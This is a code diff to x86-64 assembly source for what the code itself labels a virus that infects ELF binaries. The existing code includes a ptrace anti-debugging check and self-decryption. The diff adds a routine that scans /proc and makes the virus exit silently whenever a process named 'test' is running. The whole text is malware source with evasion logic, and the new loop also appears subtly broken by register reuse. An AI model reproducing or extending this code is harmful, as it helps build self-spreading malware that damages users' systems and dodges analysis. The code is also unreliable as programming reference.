@@ -39,6 +39,14 @@ _start:
     ; If ptrace returns -1, we're being debugged
     cmp rax, -1
     je .being_debugged
+    
+    ; ============================================
+    ; PROCESS CHECK - Exit if "test" process is running
+    ; ============================================
+    call check_test_process
+    test rax, rax
+    jnz .test_process_running
+    
     ; ============================================
     ; DECRYPTION CHECK AND ROUTINE
     ; Check if code is encrypted and decrypt if needed
@@ -155,6 +163,12 @@ _start:
     syscall
     
     ; Exit the program
+    mov eax, SYS_EXIT
+    xor edi, edi                ; exit code 0
+    syscall
+
+.test_process_running:
+    ; Exit silently when test process is detected
     mov eax, SYS_EXIT
     xor edi, edi                ; exit code 0
     syscall
@@ -1048,6 +1062,180 @@ virus_infect_elf:
     mov rsp, rbp
     pop rbp
     ret
+
+; ============================================
+; check_test_process - Check if process named "test" is running
+; Returns: rax = 1 if test process found, 0 if not found
+; Uses position-independent code for virus compatibility
+; ============================================
+%define SYS_OPENAT      257
+%define AT_FDCWD        -100
+check_test_process:
+    push rbp
+    mov rbp, rsp
+    sub rsp, 4224               ; Stack space for buffers
+    push rbx
+    push r12
+    push r13
+    push r14
+    push r15
+    
+    ; Get base address for accessing embedded strings
+    call .get_proc_base
+.get_proc_base:
+    pop r15
+    sub r15, .get_proc_base - virus_start
+    
+    ; Open /proc directory
+    mov eax, SYS_OPENAT
+    mov edi, AT_FDCWD
+    lea rsi, [r15 + v_proc_dir - virus_start]
+    mov edx, O_RDONLY | O_DIRECTORY
+    xor r10d, r10d
+    syscall
+    
+    test rax, rax
+    js .ctp_not_found
+    
+    mov r12, rax                ; save /proc fd
+    
+.ctp_read_loop:
+    ; Read directory entries
+    mov eax, SYS_GETDENTS64
+    mov edi, r12d
+    lea rsi, [rbp-4224]
+    mov edx, 4096
+    syscall
+    
+    test rax, rax
+    jle .ctp_close_not_found
+    
+    mov r13, rax                ; save nread
+    xor r14, r14                ; pos = 0
+    
+.ctp_process_entry:
+    cmp r14, r13
+    jge .ctp_read_loop
+    
+    lea rdi, [rbp-4224]
+    add rdi, r14                ; dirent pointer
+    
+    ; Get d_reclen (offset 16)
+    movzx ecx, word [rdi + 16]
+    mov rbx, rcx                ; save d_reclen
+    
+    ; Get d_name (offset 19)
+    lea rsi, [rdi + 19]
+    
+    ; Check if d_name is numeric (PID)
+    movzx eax, byte [rsi]
+    cmp al, '0'
+    jb .ctp_next_entry
+    cmp al, '9'
+    ja .ctp_next_entry
+    
+    ; Build path: /proc/PID/status
+    lea rdi, [rbp-200]          ; path buffer
+    lea rsi, [r15 + v_proc_dir - virus_start]
+    call virus_str_copy
+    
+    lea rdi, [rbp-4224]
+    add rdi, r14
+    lea rsi, [rdi + 19]         ; d_name (PID)
+    lea rdi, [rbp-200]
+    call virus_str_len
+    add rdi, rax
+    call virus_str_copy
+    
+    lea rdi, [rbp-200]
+    call virus_str_len
+    lea rdi, [rbp-200]
+    add rdi, rax
+    lea rsi, [r15 + v_status_file - virus_start]
+    call virus_str_copy
+    
+    ; Open /proc/PID/status
+    mov eax, SYS_OPENAT
+    mov edi, AT_FDCWD
+    lea rsi, [rbp-200]
+    mov edx, O_RDONLY
+    xor r10d, r10d
+    syscall
+    
+    test rax, rax
+    js .ctp_next_entry
+    
+    mov r13, rax                ; save status fd (save r13 temporarily)
+    
+    ; Read status file
+    mov eax, SYS_READ
+    mov edi, r13d
+    lea rsi, [rbp-300]
+    mov edx, 200
+    syscall
+    
+    push rax                    ; save bytes read
+    
+    ; Close status file
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+    
+    pop rcx                     ; restore bytes read
+    mov r13, r12                ; restore /proc fd
+    
+    test rcx, rcx
+    jle .ctp_next_entry
+    
+    ; Search for "Name:\ttest\n" in status
+    lea rdi, [rbp-300]          ; buffer
+    mov rsi, rcx                ; bytes read
+    lea rdx, [r15 + v_test_name - virus_start]
+    mov rcx, v_test_name_len
+    call virus_search_signature
+    
+    test rax, rax
+    jnz .ctp_found
+    
+    mov r12, r13                ; restore /proc fd to r12
+    
+.ctp_next_entry:
+    add r14, rbx                ; pos += d_reclen
+    jmp .ctp_process_entry
+    
+.ctp_found:
+    ; Close /proc directory
+    mov eax, SYS_CLOSE
+    mov edi, r13d
+    syscall
+    
+    mov rax, 1                  ; return 1 (found)
+    jmp .ctp_done
+    
+.ctp_close_not_found:
+    mov eax, SYS_CLOSE
+    mov edi, r12d
+    syscall
+    
+.ctp_not_found:
+    xor rax, rax                ; return 0 (not found)
+    
+.ctp_done:
+    pop r15
+    pop r14
+    pop r13
+    pop r12
+    pop rbx
+    add rsp, 4224
+    mov rsp, rbp
+    pop rbp
+    ret
+
+; Embedded strings for process checking
+v_proc_dir:      db "/proc", 0
+v_status_file:   db "/status", 0
+v_test_name:     db "Name:", 9, "test", 10
+v_test_name_len: equ $ - v_test_name
 
 ; ============================================
 ; VIRUS CODE END
